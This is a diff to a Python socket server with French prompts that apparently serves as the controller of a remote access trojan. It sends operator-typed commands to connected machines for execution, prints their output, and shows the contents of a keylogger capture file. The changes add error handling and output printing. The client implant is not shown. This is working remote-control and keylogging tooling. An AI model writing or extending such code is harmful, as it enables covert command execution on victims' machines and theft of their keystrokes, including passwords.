@@ -10,28 +10,33 @@ def handle_connection(connection, address):
 
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+            command = input(
+                "Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+
             if command.lower() == 'exit':
                 connection.send(b'quit')
                 break
             elif command.lower() == 'keylog':
-                with open(keylog_file, "r") as keylog:
-                    print(f"Contenu du Keylogger:\n{keylog.read()}")
+                try:
+                    with open(keylog_file, "r") as keylog:
+                        print(f"Contenu du Keylogger :\n{keylog.read()}")
+                except FileNotFoundError:
+                    print("Aucun fichier keylog trouvé.")
             else:
                 connection.send(command.encode())
 
-            response = connection.recv(4096).decode()
-            if not response:
-                break
+                response = connection.recv(4096).decode()
+                if not response:
+                    break
 
-            with open(keylog_file, "a") as keylog:
-                keylog.write(response + "\n")
+                print(f"Output:\n{response}")
 
         except Exception as e:
             print(f"Error: {e}")
             break
 
     connection.close()
+
 
 def start_server():
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,6 +48,7 @@ def start_server():
         connection, address = ss.accept()
         thread = threading.Thread(target=handle_connection, args=(connection, address))
         thread.start()
+
 
 if __name__ == "__main__":
     start_server()
